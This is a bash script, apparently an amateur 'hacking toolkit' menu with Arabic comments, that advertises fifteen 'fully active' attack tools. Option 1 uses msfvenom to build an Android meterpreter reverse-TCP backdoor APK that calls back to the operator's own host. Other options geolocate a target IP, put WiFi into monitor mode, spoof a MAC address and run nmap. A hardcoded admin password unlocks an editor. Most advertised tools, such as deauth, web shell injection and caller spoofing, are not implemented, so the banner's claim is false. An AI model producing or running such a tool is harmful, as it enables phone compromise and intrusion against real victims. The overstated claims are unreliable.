#!/bin/bash
# xxszmsx PRO | BY: STUDIO | 15 ACTIVE TOOLS
RED='\e[1;31m'; GREEN='\e[1;32m'; NC='\e[0m'

# لوحة الأدمن بكلمة السر (خيار 11)
admin_panel() {
    read -s -p "[?] Enter Password: " apass; echo ""
    if [ "$apass" == "mazen2014" ]; then
        echo -e "${GREEN}Welcome Master Mazen${NC}"; nano xxszmsx.sh
    else
        echo -e "${RED}Wrong Password!${NC}"; sleep 2
    fi
}

while true; do
    clear
    echo -e "${RED}██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
    echo "╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo " ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo " ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo "██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e "╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo "-----------------------------------------------------"
    echo "   [!] 15 FULLY ACTIVE TOOLS | POWERED BY: STUDIO    "
    echo "-----------------------------------------------------"
    echo -e "1) Build Android Hacker (.apk)  9) Email Leak Finder"
    echo "2) IP Precise Tracker (Map)     10) Router Vulnerability"
    echo "3) WiFi Monitor Mode (Start)    11) [!] ADMIN CONTROL [!]"
    echo "4) WiFi Deauth Attack           12) Fake Caller Spoof"
    echo "5) MAC Address Changer          13) Social Media Hunt"
    echo "6) Nmap Port Scanner            14) Web Shell Injector"
    echo "7) SQL Injection Scan           15) Brute Force Pass"
    echo "8) Phone Info Lookup            0) Exit"
    echo "-----------------------------------------------------"
    read -p "Studio >> " choice

    case $choice in
        1) # صنع ملف الهكر
           read -p "LHOST (Your IP): " lh; read -p "LPORT: " lp
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen_hacker.apk
           echo -e "${GREEN}[+] Created: mazen_hacker.apk${NC}" ;;
        2) # تتبع دقيق
           read -p "Target IP: " tip
           curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
        3) sudo airmon-ng start wlan0 ;;
        5) read -p "Interface (wlan0/eth0): " iface; sudo macchanger -r $iface ;;
        6) read -p "Target IP: " tip; nmap -sV $tip ;;
        11) admin_panel ;;
        15) # مثال لفتح أداة حقيقية
           hydra -h ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done

